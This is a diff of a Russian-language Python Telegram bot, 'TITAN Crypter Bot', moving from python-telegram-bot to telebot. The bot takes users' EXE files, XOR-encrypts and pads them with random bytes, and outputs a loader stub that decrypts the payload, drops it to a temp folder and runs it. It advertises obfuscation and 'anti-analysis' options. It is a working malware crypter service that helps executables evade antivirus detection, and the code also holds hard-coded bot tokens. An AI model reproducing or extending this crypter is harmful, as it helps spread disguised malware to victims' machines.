@@ -1,7 +1,8 @@
 import os
 import logging
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
-from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters
+import telebot
+from telebot import types
+from telebot.async_telebot import AsyncTeleBot
 import asyncio
 import threading
 from datetime import datetime
@@ -12,8 +13,8 @@ import zlib
 import base64
 
 # Конфигурация бота
-BOT_TOKEN = "8342680808:AAFo5MaFqA-ZNNLkzWRm291dSz9N2gxhJ0c"
-ADMIN_CHAT_ID = 7269254169
+BOT_TOKEN = "7645055602:AAH82SESEjhY6EjfoxNCgYew-SiJJbR6oB4"
+ADMIN_CHAT_ID = 4922949598
 
 # Настройка логирования
 logging.basicConfig(
@@ -38,7 +39,6 @@ class SimpleCrypter:
     
     def obfuscate_data(self, data):
         """Базовая обфускация"""
-        # Добавляем случайные байты в начало и конец
         header = os.urandom(random.randint(10, 50))
         footer = os.urandom(random.randint(10, 50))
         return header + data + footer
@@ -53,32 +53,23 @@ import tempfile
 import subprocess
 import sys
 
-# Закодированные данные
 ENC_DATA = b"{base64.b64encode(encrypted_data).decode()}"
-
-# Пароль для дешифровки
 PASSWORD = b"{password}"
 
 def decrypt_data(data, key):
-    """Дешифровка XOR"""
     return bytes(a ^ b for a, b in zip(data, key * (len(data) // len(key) + 1)))
 
 def main():
     try:
-        # Дешифровка
         compressed_data = decrypt_data(base64.b64decode(ENC_DATA), PASSWORD)
-        
-        # Декомпрессия
         original_data = zlib.decompress(compressed_data)
         
-        # Сохранение во временный файл
         temp_dir = tempfile.gettempdir()
         temp_file = os.path.join(temp_dir, "temp_executable.exe")
         
         with open(temp_file, "wb") as f:
             f.write(original_data)
         
-        # Запуск
         subprocess.Popen([temp_file], shell=True)
         
     except Exception as e:
@@ -92,34 +83,24 @@ if __name__ == "__main__":
     def protect_file(self, input_path, output_path, extension='.exe'):
         """Основная функция защиты файла"""
         try:
-            # Чтение исходного файла
             with open(input_path, 'rb') as f:
                 original_data = f.read()
             
-            # Генерация ключа
             password = os.urandom(32)
-            
-            # Сжатие
             compressed_data = self.compress_data(original_data)
-            
-            # Шифрование
             encrypted_data = self.simple_xor_encrypt(compressed_data, password)
             
-            # Обфускация
             if self.obfuscation_level > 10:
                 encrypted_data = self.obfuscate_data(encrypted_data)
             
             if extension == '.exe':
-                # Создание Python загрузчика
                 loader_code = self.create_loader_stub(encrypted_data, password)
                 
-                # Сохранение как Python скрипт
                 with open(output_path, 'w', encoding='utf-8') as f:
                     f.write(loader_code)
                 
                 return True, "Файл защищен успешно"
             else:
-                # Для других расширений - просто сохраняем зашифрованные данные
                 with open(output_path, 'wb') as f:
                     f.write(encrypted_data)
                 
@@ -130,41 +111,53 @@ if __name__ == "__main__":
 
 class TitanCrypterBot:
     def __init__(self):
-        # Исправленная инициализация Application
-        self.application = Application.builder().token(BOT_TOKEN).build()
+        self.bot = telebot.TeleBot(BOT_TOKEN)
         self.user_sessions = {}
         self.crypter = SimpleCrypter()
         self.setup_handlers()
         
     def setup_handlers(self):
         """Настройка обработчиков команд"""
-        self.application.add_handler(CommandHandler("start", self.start))
-        self.application.add_handler(CommandHandler("help", self.help_command))
-        self.application.add_handler(CallbackQueryHandler(self.button_handler))
-        self.application.add_handler(MessageHandler(filters.Document.ALL, self.handle_document))
-        self.application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_message))
-        
+        @self.bot.message_handler(commands=['start'])
+        def start_handler(message):
+            asyncio.run(self.start(message))
+            
+        @self.bot.message_handler(commands=['help'])
+        def help_handler(message):
+            asyncio.run(self.help_command(message))
+            
+        @self.bot.message_handler(content_types=['document'])
+        def document_handler(message):
+            asyncio.run(self.handle_document(message))
+            
+        @self.bot.message_handler(func=lambda message: True)
+        def message_handler(message):
+            asyncio.run(self.handle_message(message))
+            
+        @self.bot.callback_query_handler(func=lambda call: True)
+        def callback_handler(call):
+            asyncio.run(self.button_handler(call))
+
     async def notify_admin(self, message: str):
         """Отправка уведомления администратору"""
         try:
-            await self.application.bot.send_message(
-                chat_id=ADMIN_CHAT_ID,
-                text=message,
+            await self.bot.send_message(
+                ADMIN_CHAT_ID,
+                message,
                 parse_mode='HTML'
             )
             logger.info("Уведомление отправлено админу")
         except Exception as e:
             logger.error(f"Ошибка отправки уведомления админу: {e}")
 
-    async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+    async def start(self, message):
         """Обработка команды /start"""
         try:
-            user = update.effective_user
-            chat_id = update.effective_chat.id
+            user = message.from_user
+            chat_id = message.chat.id
             
             logger.info(f"Новый пользователь: {user.id} - {user.first_name}")
             
-            # Уведомление администратору о новом пользователе
             user_info = (
                 f"🆕 <b>Новый пользователь</b>\n"
                 f"👤 ID: {user.id}\n"
@@ -174,7 +167,6 @@ class TitanCrypterBot:
             )
             await self.notify_admin(user_info)
             
-            # Инициализация сессии пользователя
             self.user_sessions[chat_id] = {
                 'step': 'main_menu',
                 'file_path': None,
@@ -186,27 +178,27 @@ class TitanCrypterBot:
                 }
             }
             
-            # Главное меню
-            keyboard = [
-                [InlineKeyboardButton("📁 Загрузить EXE файл", callback_data="upload_file")],
-                [InlineKeyboardButton("⚙️ Настройки", callback_data="settings")],
-                [InlineKeyboardButton("❓ Помощь", callback_data="help")]
-            ]
-            reply_markup = InlineKeyboardMarkup(keyboard)
+            keyboard = types.InlineKeyboardMarkup()
+            keyboard.add(
+                types.InlineKeyboardButton("📁 Загрузить EXE файл", callback_data="upload_file"),
+                types.InlineKeyboardButton("⚙️ Настройки", callback_data="settings"),
+                types.InlineKeyboardButton("❓ Помощь", callback_data="help")
+            )
             
-            await update.message.reply_text(
+            await self.bot.send_message(
+                chat_id,
                 "🔒 <b>TITAN Crypter Bot</b>\n\n"
                 "Профессиональный инструмент для защиты исполняемых файлов\n\n"
                 "Выберите действие:",
-                reply_markup=reply_markup,
+                reply_markup=keyboard,
                 parse_mode='HTML'
             )
             
         except Exception as e:
             logger.error(f"Ошибка в start: {e}")
-            await update.message.reply_text("❌ Произошла ошибка. Попробуйте еще раз.")
+            await self.bot.send_message(message.chat.id, "❌ Произошла ошибка. Попробуйте еще раз.")
 
-    async def help_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+    async def help_command(self, message):
         """Команда помощи"""
         help_text = (
             "🤖 <b>TITAN Crypter Bot - Помощь</b>\n\n"
@@ -222,58 +214,55 @@ class TitanCrypterBot:
             "⚠️ <b>Внимание:</b> Используйте только для легальных целей!"
         )
         
-        keyboard = [[InlineKeyboardButton("🔙 Назад", callback_data="main_menu")]]
-        reply_markup = InlineKeyboardMarkup(keyboard)
+        keyboard = types.InlineKeyboardMarkup()
+        keyboard.add(types.InlineKeyboardButton("🔙 Назад", callback_data="main_menu"))
         
-        await update.message.reply_text(help_text, reply_markup=reply_markup, parse_mode='HTML')
+        await self.bot.send_message(message.chat.id, help_text, reply_markup=keyboard, parse_mode='HTML')
 
-    async def handle_document(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+    async def handle_document(self, message):
         """Обработка загруженного файла"""
         try:
-            chat_id = update.effective_chat.id
-            user = update.effective_user
+            chat_id = message.chat.id
+            user = message.from_user
             
             if chat_id not in self.user_sessions:
-                await update.message.reply_text("❌ Сначала запустите бота командой /start")
+                await self.bot.send_message(chat_id, "❌ Сначала запустите бота командой /start")
                 return
                 
-            document = update.message.document
+            document = message.document
             file_name = document.file_name or "unknown.exe"
             
             if not file_name.lower().endswith('.exe'):
-                await update.message.reply_text("❌ Поддерживаются только EXE файлы!")
+                await self.bot.send_message(chat_id, "❌ Поддерживаются только EXE файлы!")
                 return
                 
-            # Проверка размера файла
-            if document.file_size > 20 * 1024 * 1024:  # 20MB limit
-                await update.message.reply_text("❌ Файл слишком большой! Максимальный размер: 20MB")
+            if document.file_size > 20 * 1024 * 1024:
+                await self.bot.send_message(chat_id, "❌ Файл слишком большой! Максимальный размер: 20MB")
                 return
             
-            # Скачивание файла
-            file = await context.bot.get_file(document.file_id)
+            file_info = await self.bot.get_file(document.file_id)
             temp_dir = tempfile.mkdtemp()
             file_path = os.path.join(temp_dir, file_name)
             
-            await file.download_to_drive(file_path)
+            downloaded_file = await self.bot.download_file(file_info.file_path)
+            with open(file_path, 'wb') as f:
+                f.write(downloaded_file)
             
-            # Проверка что файл действительно EXE
             try:
                 with open(file_path, 'rb') as f:
                     header = f.read(2)
                     if header != b'MZ':
-                        await update.message.reply_text("❌ Это не валидный EXE файл!")
+                        await self.bot.send_message(chat_id, "❌ Это не валидный EXE файл!")
                         shutil.rmtree(temp_dir)
                         return
             except:
-                await update.message.reply_text("❌ Ошибка проверки файла!")
+                await self.bot.send_message(chat_id, "❌ Ошибка проверки файла!")
                 shutil.rmtree(temp_dir)
                 return
             
-            # Сохранение в сессии
             self.user_sessions[chat_id]['file_path'] = file_path
             self.user_sessions[chat_id]['step'] = 'file_uploaded'
             
-            # Уведомление администратору
             action_info = (
                 f"📥 <b>Пользователь загрузил файл</b>\n"
                 f"👤 ID: {user.id}\n"
@@ -284,32 +273,32 @@ class TitanCrypterBot:
             )
             await self.notify_admin(action_info)
             
-            # Меню после загрузки файла
-            keyboard = [
-                [InlineKeyboardButton("⚙️ Настроить параметры", callback_data="configure")],
-                [InlineKeyboardButton("🔒 Запустить защиту", callback_data="protect")],
-                [InlineKeyboardButton("📁 Загрузить другой файл", callback_data="upload_file")],
-                [InlineKeyboardButton("🔙 Главное меню", callback_data="main_menu")]
-            ]
-            reply_markup = InlineKeyboardMarkup(keyboard)
+            keyboard = types.InlineKeyboardMarkup()
+            keyboard.add(
+                types.InlineKeyboardButton("⚙️ Настроить параметры", callback_data="configure"),
+                types.InlineKeyboardButton("🔒 Запустить защиту", callback_data="protect"),
+                types.InlineKeyboardButton("📁 Загрузить другой файл", callback_data="upload_file"),
+                types.InlineKeyboardButton("🔙 Главное меню", callback_data="main_menu")
+            )
             
-            await update.message.reply_text(
+            await self.bot.send_message(
+                chat_id,
                 f"✅ <b>Файл успешно загружен!</b>\n\n"
                 f"📄 Имя: {file_name}\n"
                 f"📏 Размер: {document.file_size} байт\n\n"
                 "Теперь вы можете настроить параметры защиты или сразу запустить процесс:",
-                reply_markup=reply_markup,
+                reply_markup=keyboard,
                 parse_mode='HTML'
             )
             
         except Exception as e:
             logger.error(f"Ошибка обработки документа: {e}")
-            await update.message.reply_text("❌ Ошибка при загрузке файла!")
+            await self.bot.send_message(message.chat.id, "❌ Ошибка при загрузке файла!")
 
-    async def handle_message(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+    async def handle_message(self, message):
         """Обработка текстовых сообщений"""
-        chat_id = update.effective_chat.id
-        text = update.message.text
+        chat_id = message.chat.id
+        text = message.text
         
         if chat_id in self.user_sessions:
             if self.user_sessions[chat_id]['step'] == 'waiting_obfuscation':
@@ -318,18 +307,17 @@ class TitanCrypterBot:
                     if 1 <= level <= 30:
                         self.user_sessions[chat_id]['settings']['obfuscation_level'] = level
                         self.user_sessions[chat_id]['step'] = 'file_uploaded'
-                        await update.message.reply_text(f"✅ Уровень обфускации установлен: {level}")
+                        await self.bot.send_message(chat_id, f"✅ Уровень обфускации установлен: {level}")
                     else:
-                        await update.message.reply_text("❌ Введите число от 1 до 30")
+                        await self.bot.send_message(chat_id, "❌ Введите число от 1 до 30")
                 except:
-                    await update.message.reply_text("❌ Введите корректное число")
+                    await self.bot.send_message(chat_id, "❌ Введите корректное число")
 
-    async def show_settings(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+    async def show_settings(self, call):
         """Показать настройки"""
         try:
-            chat_id = update.effective_chat.id
+            chat_id = call.message.chat.id
             if chat_id not in self.user_sessions:
-                await self.start(update, context)
                 return
                 
             settings = self.user_sessions[chat_id]['settings']
@@ -341,121 +329,49 @@ class TitanCrypterBot:
                 f"🔍 Анти-анализ: <b>{'Включено' if settings['anti_analysis'] else 'Выключено'}</b>"
             )
             
-            keyboard = [
-                [
-                    InlineKeyboardButton("🔢 Уровень обфускации", callback_data="set_obfuscation"),
-                    InlineKeyboardButton("📁 Расширение", callback_data="set_extension")
-                ],
-                [
-                    InlineKeyboardButton("🔍 Анти-анализ", callback_data="toggle_anti_analysis"),
-                    InlineKeyboardButton("💾 Сохранить", callback_data="save_settings")
-                ],
-                [InlineKeyboardButton("🔙 Назад", callback_data="main_menu")]
-            ]
-            reply_markup = InlineKeyboardMarkup(keyboard)
+            keyboard = types.InlineKeyboardMarkup()
+            keyboard.add(
+                types.InlineKeyboardButton("🔢 Уровень обфускации", callback_data="set_obfuscation"),
+                types.InlineKeyboardButton("📁 Расширение", callback_data="set_extension")
+            )
+            keyboard.add(
+                types.InlineKeyboardButton("🔍 Анти-анализ", callback_data="toggle_anti_analysis"),
+                types.InlineKeyboardButton("💾 Сохранить", callback_data="save_settings")
+            )
+            keyboard.add(types.InlineKeyboardButton("🔙 Назад", callback_data="main_menu"))
             
-            if update.callback_query:
-                await update.callback_query.edit_message_text(
-                    settings_text, 
-                    reply_markup=reply_markup, 
-                    parse_mode='HTML'
-                )
-            else:
-                await update.message.reply_text(
-                    settings_text, 
-                    reply_markup=reply_markup, 
-                    parse_mode='HTML'
-                )
+            await self.bot.edit_message_text(
+                settings_text,
+                chat_id,
+                call.message.message_id,
+                reply_markup=keyboard,
+                parse_mode='HTML'
+            )
         except Exception as e:
             logger.error(f"Ошибка в show_settings: {e}")
 
-    async def show_obfuscation_menu(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """Меню настройки уровня обфускации"""
-        try:
-            chat_id = update.effective_chat.id
-            current_level = self.user_sessions[chat_id]['settings']['obfuscation_level']
-            
-            keyboard = [
-                [InlineKeyboardButton("🔽 Низкий (10)", callback_data="set_obl_10")],
-                [InlineKeyboardButton("🔼 Средний (20)", callback_data="set_obl_20")],
-                [InlineKeyboardButton("🚀 Высокий (30)", callback_data="set_obl_30")],
-                [InlineKeyboardButton("🔙 Назад", callback_data="settings")]
-            ]
-            reply_markup = InlineKeyboardMarkup(keyboard)
-            
-            await update.callback_query.edit_message_text(
-                f"🔢 <b>Настройка уровня обфускации</b>\n\n"
-                f"Текущий уровень: <b>{current_level}/30</b>\n\n"
-                "Выберите уровень:",
-                reply_markup=reply_markup,
-                parse_mode='HTML'
-            )
-        except Exception as e:
-            logger.error(f"Ошибка в show_obfuscation_menu: {e}")
-
-    async def show_extension_menu(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """Меню выбора расширения"""
-        try:
-            chat_id = update.effective_chat.id
-            current_ext = self.user_sessions[chat_id]['settings']['extension']
-            
-            extensions = ['.exe', '.py', '.bat', '.txt']
-            
-            keyboard = []
-            for ext in extensions:
-                keyboard.append([InlineKeyboardButton(
-                    f"📁 {ext} {'✅' if ext == current_ext else ''}", 
-                    callback_data=f"set_ext_{ext}"
-                )])
-            
-            keyboard.append([InlineKeyboardButton("🔙 Назад", callback_data="settings")])
-            reply_markup = InlineKeyboardMarkup(keyboard)
-            
-            await update.callback_query.edit_message_text(
-                "📁 <b>Выбор расширения выходного файла</b>\n\n"
-                f"Текущее расширение: <b>{current_ext}</b>",
-                reply_markup=reply_markup,
-                parse_mode='HTML'
-            )
-        except Exception as e:
-            logger.error(f"Ошибка в show_extension_menu: {e}")
-
-    def run_async_in_thread(self, chat_id, context):
-        """Запуск асинхронной функции в отдельном потоке"""
-        loop = asyncio.new_event_loop()
-        asyncio.set_event_loop(loop)
-        try:
-            loop.run_until_complete(self.process_protection(chat_id, context))
-        except Exception as e:
-            logger.error(f"Ошибка в потоке: {e}")
-        finally:
-            loop.close()
-
-    async def process_protection(self, chat_id: int, context: ContextTypes.DEFAULT_TYPE):
+    async def process_protection(self, chat_id: int):
         """Обработка защиты файла"""
         try:
             session = self.user_sessions.get(chat_id)
             if not session:
-                await context.bot.send_message(chat_id, "❌ Сессия устарела! Начните с /start")
+                await self.bot.send_message(chat_id, "❌ Сессия устарела! Начните с /start")
                 return
                 
             file_path = session.get('file_path')
             
             if not file_path or not os.path.exists(file_path):
-                await context.bot.send_message(chat_id, "❌ Файл не найден! Загрузите файл заново.")
+                await self.bot.send_message(chat_id, "❌ Файл не найден! Загрузите файл заново.")
                 return
             
             settings = session['settings']
             
-            # Настройка криптера
             self.crypter.obfuscation_level = settings['obfuscation_level']
             self.crypter.anti_analysis_enabled = settings['anti_analysis']
             
-            # Создание выходного файла
             output_filename = f"protected_{datetime.now().strftime('%H%M%S')}{settings['extension']}"
             output_path = os.path.join(tempfile.gettempdir(), output_filename)
             
-            # Прогресс-сообщения
             progress_messages = [
                 "🔄 Проверка файла...",
                 "📖 Чтение данных...",
@@ -467,30 +383,28 @@ class TitanCrypterBot:
             
             for i, message in enumerate(progress_messages):
                 progress = (i + 1) * 20
-                await context.bot.send_message(chat_id, f"{message} ({progress}%)")
+                await self.bot.send_message(chat_id, f"{message} ({progress}%)")
                 await asyncio.sleep(1)
             
-            # Запуск защиты
             success, result_message = self.crypter.protect_file(file_path, output_path, settings['extension'])
             
             if success and os.path.exists(output_path):
                 file_size = os.path.getsize(output_path)
                 
                 with open(output_path, 'rb') as f:
-                    await context.bot.send_document(
+                    await self.bot.send_document(
                         chat_id,
-                        document=f,
+                        f,
                         caption=(
                             f"✅ <b>Файл успешно защищен!</b>\n\n"
                             f"📁 Расширение: {settings['extension']}\n"
                             f"🔢 Уровень обфускации: {settings['obfuscation_level']}/30\n"
                             f"📏 Размер: {file_size} байт"
                         ),
-                        filename=output_filename,
+                        visible_file_name=output_filename,
                         parse_mode='HTML'
                     )
                 
-                # Уведомление администратору
                 user_info = session.get('user_info', 'Unknown')
                 action_info = (
                     f"🔒 <b>Успешная защита файла</b>\n"
@@ -503,13 +417,12 @@ class TitanCrypterBot:
                 await self.notify_admin(action_info)
                 
             else:
-                await context.bot.send_message(chat_id, f"❌ Ошибка: {result_message}")
+                await self.bot.send_message(chat_id, f"❌ Ошибка: {result_message}")
                 
         except Exception as e:
             logger.error(f"Ошибка обработки файла: {e}")
-            await context.bot.send_message(chat_id, f"❌ Критическая ошибка: {str(e)}")
+            await self.bot.send_message(chat_id, f"❌ Критическая ошибка: {str(e)}")
         finally:
-            # Очистка временных файлов
             try:
                 session = self.user_sessions.get(chat_id)
                 if session and session.get('file_path'):
@@ -519,16 +432,12 @@ class TitanCrypterBot:
             except Exception as e:
                 logger.error(f"Ошибка очистки временных файлов: {e}")
 
-    async def button_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+    async def button_handler(self, call):
         """Обработчик нажатий на кнопки"""
         try:
-            query = update.callback_query
-            await query.answer()
+            chat_id = call.message.chat.id
+            data = call.data
             
-            chat_id = query.message.chat_id
-            data = query.data
-            
-            # Инициализация сессии если нужно
             if chat_id not in self.user_sessions:
                 self.user_sessions[chat_id] = {
                     'step': 'main_menu', 
@@ -539,84 +448,63 @@ class TitanCrypterBot:
                     }
                 }
             
-            # Обработка действий
             if data == "main_menu":
-                keyboard = [
-                    [InlineKeyboardButton("📁 Загрузить EXE файл", callback_data="upload_file")],
-                    [InlineKeyboardButton("⚙️ Настройки", callback_data="settings")],
-                    [InlineKeyboardButton("❓ Помощь", callback_data="help")]
-                ]
-                reply_markup = InlineKeyboardMarkup(keyboard)
+                keyboard = types.InlineKeyboardMarkup()
+                keyboard.add(
+                    types.InlineKeyboardButton("📁 Загрузить EXE файл", callback_data="upload_file"),
+                    types.InlineKeyboardButton("⚙️ Настройки", callback_data="settings"),
+                    types.InlineKeyboardButton("❓ Помощь", callback_data="help")
+                )
                 
-                await query.edit_message_text(
+                await self.bot.edit_message_text(
                     "🔒 <b>TITAN Crypter Bot</b>\n\nВыберите действие:",
-                    reply_markup=reply_markup,
+                    chat_id,
+                    call.message.message_id,
+                    reply_markup=keyboard,
                     parse_mode='HTML'
                 )
                 
             elif data == "upload_file":
-                await query.edit_message_text(
+                await self.bot.edit_message_text(
                     "📁 <b>Загрузка файла</b>\n\n"
                     "Пожалуйста, отправьте EXE файл как документ:",
+                    chat_id,
+                    call.message.message_id,
                     parse_mode='HTML'
                 )
                 
             elif data == "settings":
-                await self.show_settings(update, context)
+                await self.show_settings(call)
                 
             elif data == "help":
-                await self.help_command(update, context)
+                await self.help_command(call.message)
                 
             elif data == "configure":
-                await self.show_settings(update, context)
+                await self.show_settings(call)
                 
-            elif data == "set_obfuscation":
-                await self.show_obfuscation_menu(update, context)
+            elif data == "protect":
+                if not self.user_sessions[chat_id].get('file_path'):
+                    await self.bot.answer_callback_query(call.id, "❌ Сначала загрузите файл!")
+                    return
+                    
+                await self.bot.edit_message_text(
+                    "🚀 Запуск защиты...",
+                    chat_id,
+                    call.message.message_id
+                )
                 
-            elif data == "set_extension":
-                await self.show_extension_menu(update, context)
-                
-            elif data.startswith("set_obl_"):
-                level = int(data.split('_')[2])
-                self.user_sessions[chat_id]['settings']['obfuscation_level'] = level
-                await query.edit_message_text(f"✅ Уровень установлен: {level}")
-                await asyncio.sleep(1)
-                await self.show_settings(update, context)
-                
-            elif data.startswith("set_ext_"):
-                extension = data.split('_', 2)[2]
-                self.user_sessions[chat_id]['settings']['extension'] = extension
-                await query.edit_message_text(f"✅ Расширение установлено: {extension}")
-                await asyncio.sleep(1)
-                await self.show_settings(update, context)
+                await self.process_protection(chat_id)
                 
             elif data == "toggle_anti_analysis":
                 current = self.user_sessions[chat_id]['settings']['anti_analysis']
                 self.user_sessions[chat_id]['settings']['anti_analysis'] = not current
                 status = "включен" if not current else "выключен"
-                await query.edit_message_text(f"✅ Анти-анализ {status}")
+                await self.bot.answer_callback_query(call.id, f"✅ Анти-анализ {status}")
                 await asyncio.sleep(1)
-                await self.show_settings(update, context)
+                await self.show_settings(call)
                 
             elif data == "save_settings":
-                await query.edit_message_text("✅ Настройки сохранены!")
-                await asyncio.sleep(1)
-                await self.show_settings(update, context)
-                
-            elif data == "protect":
-                if not self.user_sessions[chat_id].get('file_path'):
-                    await query.edit_message_text("❌ Сначала загрузите файл!")
-                    return
-                    
-                await query.edit_message_text("🚀 Запуск защиты...")
-                
-                # Запуск в отдельном потоке
-                thread = threading.Thread(
-                    target=self.run_async_in_thread,
-                    args=(chat_id, context)
-                )
-                thread.daemon = True
-                thread.start()
+                await self.bot.answer_callback_query(call.id, "✅ Настройки сохранены!")
                 
         except Exception as e:
             logger.error(f"Ошибка в button_handler: {e}")
@@ -629,11 +517,7 @@ class TitanCrypterBot:
             print(f"Токен: {BOT_TOKEN}")
             print(f"Admin ID: {ADMIN_CHAT_ID}")
             
-            # Исправленный запуск polling
-            self.application.run_polling(
-                allowed_updates=Update.ALL_TYPES,
-                drop_pending_updates=True
-            )
+            self.bot.infinity_polling()
             
         except KeyboardInterrupt:
             logger.info("Бот остановлен пользователем")
@@ -643,7 +527,6 @@ class TitanCrypterBot:
             print(f"Критическая ошибка: {e}")
 
 if __name__ == "__main__":
-    # Проверка токена
     if BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
         print("❌ Установите токен бота!")
         exit(1)
